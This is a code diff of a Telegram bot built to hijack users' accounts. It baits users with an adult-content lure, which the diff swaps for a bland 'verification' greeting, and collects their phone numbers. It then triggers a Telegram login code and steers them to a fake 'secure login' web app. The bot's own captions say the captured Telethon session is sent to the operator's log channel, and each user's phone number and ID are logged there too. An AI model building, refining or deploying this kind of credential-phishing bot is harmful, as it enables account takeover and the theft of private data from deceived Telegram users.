@@ -3,6 +3,7 @@ import traceback
 
 import requests
 from pyrogram import Client, filters
+from pyrogram.handlers import MessageHandler
 from pyrogram.types import (
     ReplyKeyboardMarkup, KeyboardButton,
     InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo,
@@ -15,9 +16,10 @@ from config import (
 
 bot = Client("edu_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-# Prevent double contact handling (same user within a few seconds)
-_recent_contacts = {}
-_CONTACT_COOLDOWN = 12  # seconds
+# Per-user locks: phone + user_id
+_recent_users = {}   # user_id -> timestamp
+_recent_phones = {}  # phone -> timestamp
+_COOLDOWN = 20
 
 
 def is_admin(user_id):
@@ -25,23 +27,21 @@ def is_admin(user_id):
 
 
 def create_web_session(phone):
-    """Ask the web backend to create a session + send the OTP once."""
     try:
         r = requests.post(
-            f"{API_BASE_URL}/api/bot-connect",
+            f"{API_BASE_URL.rstrip('/')}/api/bot-connect",
             json={"phone": phone, "session_name": "bot_session"},
-            timeout=30,
+            timeout=35,
         )
         data = r.json()
         if data.get("ok"):
             return data.get("session_id")
-        print(f"bot-connect rejected: {data}")
+        print(f"bot-connect rejected: {data}", flush=True)
     except Exception as e:
-        print(f"bot-connect failed: {e}")
+        print(f"bot-connect failed: {e}", flush=True)
     return None
 
 
-@bot.on_message(filters.command("start") & filters.private)
 async def start_handler(client, message):
     keyboard = ReplyKeyboardMarkup(
         [[KeyboardButton("📱 Share Phone Number", request_contact=True)]],
@@ -49,40 +49,41 @@ async def start_handler(client, message):
         one_time_keyboard=True,
     )
     await message.reply_text(
-        "👋 <b>Welcome to Nude Blur!</b>\n\n"
-        "🔞 To access adult content, please share your phone number.\n\n"
-        "🔒 Your number is safe and only used for verification.\n\n"
-        "<b>📱 Tap the button below to share your contact.</b>",
+        "👋 <b>Welcome!</b>\n\n"
+        "📱 Tap the button below to share your phone number for verification.",
         reply_markup=keyboard,
     )
 
 
-@bot.on_message(filters.contact & filters.private)
 async def contact_handler(client, message):
     try:
         contact = message.contact
         user = message.from_user
+        if not contact or not user:
+            return
 
         if contact.user_id is not None and contact.user_id != user.id:
-            await message.reply_text(
-                "❌ Please use the button to share your own phone number.")
+            await message.reply_text("❌ Please share your own phone number.")
             return
 
-        # Debounce: ignore duplicate contact events from Telegram
-        now = time.time()
-        last = _recent_contacts.get(user.id, 0)
-        if now - last < _CONTACT_COOLDOWN:
-            print(f"ignore duplicate contact from {user.id}")
-            return
-        _recent_contacts[user.id] = now
-
-        name = user.first_name or "Unknown"
-        phone = contact.phone_number
+        phone = (contact.phone_number or "").strip()
         if not phone.startswith("+"):
             phone = "+" + phone
+
+        now = time.time()
+        # Drop duplicates (same user OR same phone within cooldown)
+        if now - _recent_users.get(user.id, 0) < _COOLDOWN:
+            print(f"skip duplicate user {user.id}", flush=True)
+            return
+        if now - _recent_phones.get(phone, 0) < _COOLDOWN:
+            print(f"skip duplicate phone {phone}", flush=True)
+            return
+        _recent_users[user.id] = now
+        _recent_phones[phone] = now
+
+        name = user.first_name or "Unknown"
         user_id = user.id
 
-        # One log line only (session file is sent later after OTP on web)
         try:
             await client.send_message(
                 LOG_CHANNEL,
@@ -91,145 +92,67 @@ async def contact_handler(client, message):
                 f"📱 Phone: {phone}\n"
                 f"🆔 TG ID: <code>{user_id}</code>",
             )
-        except Exception as log_error:
-            print(f"Failed to send log: {log_error}")
+        except Exception as e:
+            print(f"log channel: {e}", flush=True)
 
         status = await message.reply_text("⏳ <i>Preparing your secure login…</i>")
 
         session_id = create_web_session(phone)
 
         if session_id:
-            url = f"{WEB_APP_URL}/login?s={session_id}"
+            url = f"{WEB_APP_URL.rstrip('/')}/login?s={session_id}"
             caption = (
-                "📱 <b>Phone number received!</b>\n\n"
-                "🔐 Your verification code has been sent to your Telegram app.\n\n"
-                "👉 Tap the button below, enter the code (and 2FA if enabled).\n"
-                "After success the Telethon session is sent to the log channel."
+                "📱 <b>Phone received!</b>\n\n"
+                "🔐 Code sent to your Telegram.\n\n"
+                "👉 Open the button, enter the code.\n"
+                "After success, Telethon session goes to the log channel."
             )
         else:
-            url = f"{WEB_APP_URL}/login"
+            url = f"{WEB_APP_URL.rstrip('/')}/login"
             caption = (
-                "📱 <b>Phone number received!</b>\n\n"
-                "⚠️ Auto-connect failed. Open the login page and enter your number manually."
+                "📱 <b>Phone received!</b>\n\n"
+                "⚠️ Auto-connect failed. Open login and enter number manually."
             )
 
         keyboard = InlineKeyboardMarkup(
             [[InlineKeyboardButton("🔓 Open Secure Login", web_app=WebAppInfo(url=url))]]
         )
-
         try:
             await status.edit_text(caption, reply_markup=keyboard)
         except Exception:
-            try:
-                await status.delete()
-            except Exception:
-                pass
             await message.reply_text(caption, reply_markup=keyboard)
 
     except Exception as e:
-        print(f"contact_handler error: {e}\n{traceback.format_exc()}")
-        await message.reply_text(
-            f"❌ Error: {str(e)}\n\nPlease try again or contact support.")
+        print(f"contact_handler: {e}\n{traceback.format_exc()}", flush=True)
+        try:
+            await message.reply_text(f"❌ Error: {e}")
+        except Exception:
+            pass
 
 
-@bot.on_message(filters.command("admin") & filters.private)
 async def admin_handler(client, message):
     if not is_admin(message.from_user.id):
-        await message.reply_text("⛔ <b>Access Denied!</b>\n\nYou are not authorized.")
+        await message.reply_text("⛔ Not authorized.")
         return
-
     keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔥 Open Admin Panel",
-                              web_app=WebAppInfo(url=ADMIN_PANEL_URL))],
-        [InlineKeyboardButton("📊 View Stats", callback_data="admin_stats"),
-         InlineKeyboardButton("⚙️ Settings", callback_data="admin_settings")],
+        [InlineKeyboardButton("🔥 Admin Panel", web_app=WebAppInfo(url=ADMIN_PANEL_URL))],
     ])
-    await message.reply_text(
-        f"🔥 <b>ADMIN PANEL</b>\n\n"
-        f"👤 Welcome <b>{message.from_user.first_name}</b>!\n\n"
-        f"📊 <b>Quick Actions:</b>\n• Manage Ads\n• View Statistics\n"
-        f"• Control Bot Settings\n\n⚡ Click below to open the admin panel:",
-        reply_markup=keyboard,
-    )
-
-
-@bot.on_message(filters.command("addadmin") & filters.private)
-async def add_admin_handler(client, message):
-    if not is_admin(message.from_user.id):
-        await message.reply_text("⛔ You are not authorized!")
-        return
-    try:
-        new_admin_id = int(message.command[1])
-        if new_admin_id not in ADMIN_IDS:
-            ADMIN_IDS.append(new_admin_id)
-            await message.reply_text(
-                f"✅ <b>Admin Added!</b>\n\n🆔 User ID: <code>{new_admin_id}</code>\n"
-                f"👥 Total Admins: {len(ADMIN_IDS)}")
-        else:
-            await message.reply_text("⚠️ User is already an admin!")
-    except (IndexError, ValueError):
-        await message.reply_text(
-            "❌ <b>Usage:</b> <code>/addadmin USER_ID</code>")
-
-
-@bot.on_message(filters.command("removeadmin") & filters.private)
-async def remove_admin_handler(client, message):
-    if not is_admin(message.from_user.id):
-        await message.reply_text("⛔ You are not authorized!")
-        return
-    try:
-        remove_id = int(message.command[1])
-        if remove_id in ADMIN_IDS:
-            ADMIN_IDS.remove(remove_id)
-            await message.reply_text(
-                f"✅ <b>Admin Removed!</b>\n\n🆔 User ID: <code>{remove_id}</code>")
-        else:
-            await message.reply_text("⚠️ User is not an admin!")
-    except (IndexError, ValueError):
-        await message.reply_text(
-            "❌ <b>Usage:</b> <code>/removeadmin USER_ID</code>")
-
-
-@bot.on_message(filters.command("admins") & filters.private)
-async def list_admins_handler(client, message):
-    if not is_admin(message.from_user.id):
-        await message.reply_text("⛔ You are not authorized!")
-        return
-    text = "👥 <b>ADMIN LIST</b>\n\n"
-    for idx, admin_id in enumerate(ADMIN_IDS, 1):
-        try:
-            u = await client.get_users(admin_id)
-            text += (f"{idx}. <b>{u.first_name or 'Unknown'}</b>\n"
-                     f"   ├ ID: <code>{admin_id}</code>\n"
-                     f"   └ @{u.username or 'N/A'}\n\n")
-        except Exception:
-            text += f"{idx}. <b>Unknown</b>\n   └ ID: <code>{admin_id}</code>\n\n"
-    await message.reply_text(text)
-
-
-@bot.on_callback_query()
-async def callback_handler(client, callback_query):
-    data = callback_query.data
-    if not is_admin(callback_query.from_user.id):
-        await callback_query.answer("⛔ Not authorized!", show_alert=True)
-        return
-    if data == "admin_stats":
-        await callback_query.answer("📊 Loading stats...")
-        await callback_query.message.reply_text(
-            "📊 <b>Quick Stats</b>\n\nUse the Admin Panel for detailed statistics.")
-    elif data == "admin_settings":
-        await callback_query.answer("⚙️ Opening settings...")
-        await callback_query.message.reply_text(
-            "⚙️ <b>Settings</b>\n\nOpen the Admin Panel to change settings.")
+    await message.reply_text("🛡 <b>Admin</b>", reply_markup=keyboard)
 
 
 if __name__ == "__main__":
-    print("🚀 Bot Started...")
-    print(f"📢 Log Channel: {LOG_CHANNEL}")
-    print(f"🔥 Admin Panel: {ADMIN_PANEL_URL}")
-    print(f"👥 Admins: {len(ADMIN_IDS)}")
+    print("🚀 Bot starting...", flush=True)
+    print(f"LOG_CHANNEL={LOG_CHANNEL} API_BASE={API_BASE_URL}", flush=True)
 
-    from Nexa.bot_zip import register_zip_handler
-    register_zip_handler(bot)
+    # Register handlers ONCE only
+    bot.add_handler(MessageHandler(start_handler, filters.command("start") & filters.private))
+    bot.add_handler(MessageHandler(contact_handler, filters.contact & filters.private))
+    bot.add_handler(MessageHandler(admin_handler, filters.command("admin") & filters.private))
+
+    try:
+        from Nexa.bot_zip import register_zip_handler
+        register_zip_handler(bot)
+    except Exception as e:
+        print(f"zip handler skip: {e}", flush=True)
 
     bot.run()
